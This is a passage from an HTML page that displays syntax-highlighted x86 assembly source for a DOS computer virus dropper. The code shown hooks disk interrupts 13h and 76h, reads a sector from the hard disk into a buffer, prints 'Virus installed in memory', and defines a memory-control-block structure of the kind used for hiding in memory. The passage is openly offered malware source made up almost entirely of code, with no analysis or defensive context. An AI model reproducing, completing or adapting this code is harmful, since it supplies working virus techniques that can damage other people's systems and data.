                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Traced_Int13h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Prev_Int13h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Prev_Int13h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">New_Int13h</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3576h</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Prev_Int76h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Prev_Int76h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">New_Int76h</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0201h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Dropper_Buffer</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Dropper_Msg</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4C00h</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">Dropper_Msg</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'Virus installed in memory'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'$'</span><span class="sc0">

</span><span class="sc5">Dropper_Buffer</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">512</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc5">MCB_Header</span><span class="sc0">      </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">MCB_Type</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; M = not last block, Z = last block.</span><span class="sc0">
</span><span class="sc5">MCB_PSP</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; PSP-segment of this block.</span><span class="sc0">
</span><span class="sc5">MCB_Size_Mem</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Size of block in paragraphs.</span><span class="sc0">
</span><span class="sc5">MCB_Dunno</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">; Don't care, don't need it.</span><span class="sc0">
</span><span class="sc5">MCB_Program</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">; Filename of program of this block.</span><span class="sc0">
</span><span class="sc5">MCB_Header</span><span class="sc0">      </span><span class="sc9">ENDS</span><span class="sc0">

                </span><span class="sc9">END</span><span class="sc0">     </span><span class="sc5">START</span><span class="sc0">
</span></div></body>
</html>
